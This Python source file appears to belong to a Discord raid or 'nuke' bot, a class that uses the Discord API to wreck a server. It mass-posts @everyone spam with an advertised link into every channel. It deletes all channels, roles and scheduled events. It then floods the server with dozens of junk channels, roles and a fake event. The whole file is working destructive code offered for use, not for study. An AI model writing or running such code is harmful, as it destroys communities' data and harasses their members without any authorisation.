import datetime
from datetime import datetime, timedelta

from aiohttp import ClientSession

from ..config.config import (CHNAME, EVENT_NAME, LINKSERV, ROLENAME, TEXT,
                             headers)
from .async_tasks import create_tasks, request


class Fucker:
    def __init__(self, ctx):
        self.ctx = ctx
        self.headers = headers

    async def spam(self, ctx):
        spam_amount = 10
        urls = []
        embed = {
            "title": "xdearboy | github.com/xdearboy",
            "description": f"```{TEXT}```\n\n> {LINKSERV}",
        }
        json = {"content": f"@everyone {LINKSERV}", "embed": embed}

        channels = self.ctx.guild.text_channels + self.ctx.guild.voice_channels
        for channel in channels:
            urls.extend(
                [
                    f"https://discord.com/api/v9/channels/{channel.id}/messages"
                    for _ in range(spam_amount)
                ]
            )
        async with ClientSession(headers=self.headers, connector=None) as session:
            await create_tasks(urls, session.post, self.headers, json)

    async def crChannels(self, ctx):
        urls = [
            f"https://discord.com/api/v9/guilds/{self.ctx.guild.id}/channels"
            for _ in range(35)
        ]
        json = {"name": CHNAME, "topic": "", "type": 0}
        async with ClientSession(headers=self.headers, connector=None) as session:
            await create_tasks(urls, session.post, self.headers, json)

    async def create_event(self, ctx):
        name = EVENT_NAME
        time = (datetime.now() + timedelta(days=30)).isoformat()
        json = {
            "channel_id": None,
            "entity_metadata": {"location": name},
            "name": name,
            "privacy_level": 2,
            "scheduled_start_time": datetime.now().isoformat(),
            "scheduled_end_time": time,
            "description": name,
            "entity_type": 3,
            "image": None,
        }
        url = f"https://discord.com/api/v10/guilds/{self.ctx.guild.id}/scheduled-events"
        async with ClientSession(headers=self.headers, connector=None) as session:
            await session.post(url, json=json)

    async def delRoles(self, ctx):
        async with ClientSession(headers=self.headers, connector=None) as session:
            for role in self.ctx.guild.roles:
                url = f"https://discord.com/api/v9/guilds/{self.ctx.guild.id}/roles/{role.id}"
                await request(session.delete, url, self.headers)

    async def delete_events(self, ctx):
        async with ClientSession(headers=self.headers, connector=None) as session:
            url = f"https://discord.com/api/v10/guilds/{self.ctx.guild.id}/scheduled-events"
            events = await session.get(url)
            events = await events.json()
            urls = [
                f'https://discord.com/api/v10/guilds/{self.ctx.guild.id}/scheduled-events/{event["id"]}'
                for event in events
            ]
            await create_tasks(urls, session.delete, self.headers)

    async def delChannels(self, ctx):
        urls = [
            f"https://discord.com/api/v9/channels/{channel.id}"
            for channel in self.ctx.guild.channels
        ]
        async with ClientSession(headers=self.headers, connector=None) as session:
            await create_tasks(urls, session.delete, self.headers)

    async def crRoles(self, ctx, name="hidakiteamfuckyo"):
        urls = [
            f"https://discord.com/api/v8/guilds/{self.ctx.guild.id}/roles"
            for _ in range(20)
        ]
        json = {"name": ROLENAME}
        async with ClientSession(headers=self.headers, connector=None) as session:
            await create_tasks(urls, session.post, self.headers, json)
